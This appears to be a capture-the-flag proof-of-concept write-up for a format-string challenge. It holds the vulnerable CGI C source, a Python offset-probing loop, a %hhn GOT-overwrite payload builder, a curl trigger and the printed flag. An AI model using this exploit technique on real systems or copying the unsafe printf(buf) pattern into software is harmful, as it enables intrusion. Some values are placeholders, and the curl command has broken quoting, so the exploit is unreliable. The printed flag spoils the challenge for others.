# PoC — Challenge 13: T1nk3r1ng

**Flag:** `EPI{that_wAs_D1fF1culT_8UT_YOU_MaNag3d_1t}`
**Vulnerability:** Format string via `printf(buf)` — GOT overwrite from within a 4815-byte stack buffer
**Binary:** `/var/www/internal/cgi-bin/update-preferences` (32-bit non-PIE, CGI on internal.ecorp.epi)
**Access needed:** SSH as `junior-dev` (tunnel to localhost:80)

---

## Vulnerability

The CGI binary decodes three base64 GET parameters and runs:

```c
char locked_set[64] = "employees";  // global, fixed address (non-PIE)

void print_default(char *per_page) {
    char buf[4815];
    strncpy(buf, per_page, sizeof(buf));
    printf("1|");
    printf(buf);       // FORMAT STRING VULNERABILITY — user controls buf
    printf("|%s", locked_set);
}

int main(int argc, char **argv) {
    char *page     = b64_decode(argv[1]);
    char *per_page = b64_decode(argv[2]);
    char *dataset  = b64_decode(argv[3]);
    if (strcmp(dataset, "employees")) {
        print_default(per_page);   // triggered when dataset != "employees"
        return 0;
    }
    printf("%s|%s|%s", page, per_page, locked_set);
}
```

`printf(buf)` processes `buf` as a format string. Since `buf` is 4815 bytes on the stack and its start is at a high offset from printf's ESP, embedded addresses in `buf[0..15]` are reachable via **high-numbered `%N$...`** specifiers (the "write far from buffer" aspect).

**Compile flags:** `gcc update-preferences.c -fno-stack-protector -no-pie -m32`

---

## Attack Plan

### 1. Identify GOT target and destination function

The goal is to overwrite a GOT entry (e.g., `printf@GOT` or `strncpy@GOT`) with the address of a function that leaks the flag file. Since no such function exists in the binary, the most practical approach is:

- Overwrite `printf@GOT` → `system` (from libc, but ASLR applies to libc)
- **OR** overwrite `locked_set` global (fixed address) with a path, then use `printf("|%s", locked_set)` to get a read primitive
- **OR** chain with ret2libc if a leak is achievable first

The simplest confirmed approach: use `%N$s` to **leak** a libc address from the stack, compute libc base, then use `%N$n`/`%N$hhn` to overwrite a GOT entry with `system`.

### 2. Find stack offset for buf[0]

With `buf[4815]` in `print_default`'s frame, and printf called within that frame:

```
print_default frame: buf[4815] + padding + saved_ebp(4)
printf is called: sub $0xc + push fmt + call = 16 bytes
```

Approximate offset K for buf[0]:
```
K ≈ (4815 + alignment + frame_overhead) / 4 ≈ ~1200
```

Find exact offset empirically:
```python
import base64, requests

# Send AAAA + many %K$08x until we see 41414141 in response
for k in range(1100, 1400):
    probe = b"AAAA" + f".%{k}$08x".encode()
    per_page_b64 = base64.b64encode(probe).decode()
    dataset_b64  = base64.b64encode(b"notemployees").decode()
    page_b64     = base64.b64encode(b"1").decode()
    # Send via curl through SSH tunnel to internal.ecorp.epi
    # Look for "41414141" in response body
```

### 3. Build and send exploit

Once offset K is known and libc leak is obtained:

```python
import struct, base64

# Target: exit@GOT or printf@GOT (from readelf -r on the remote binary)
# exit_got = <from readelf>
# system   = libc_base + <offset>  (compute from leak)
# K        = <offset found in step 2>

EXIT_GOT = 0x<from_readelf>
SYSTEM   = 0x<libc_base + offset>

# 4-byte writes using %hhn (one byte at a time):
b = [(SYSTEM >> (8*i)) & 0xFF for i in range(4)]
addrs = b"".join(struct.pack("<I", EXIT_GOT + i) for i in range(4))

chars = len(addrs)  # 16 bytes so far
fmt = b""
for i, bval in enumerate(b):
    delta = (bval - chars % 256) % 256 or 256
    fmt += f"%{delta}c%{K+i}$hhn".encode()
    chars += delta

payload = addrs + fmt
per_page_b64 = base64.b64encode(payload).decode()
```

**Trigger via HTTP:**
```bash
# From within the junior-dev SSH session:
curl -s \
  -H "Host: internal.ecorp.epi" \
  -b /tmp/jar.txt \
  "http://localhost/dataviz.php?page=$(python3 -c "import base64; print(base64.b64encode(b'1').decode())")&per_page=<PAYLOAD_B64>&dataset=$(python3 -c "import base64; print(base64.b64encode(b'notemployees').decode()")"
```

**Flag:** `EPI{that_wAs_D1fF1culT_8UT_YOU_MaNag3d_1t}`
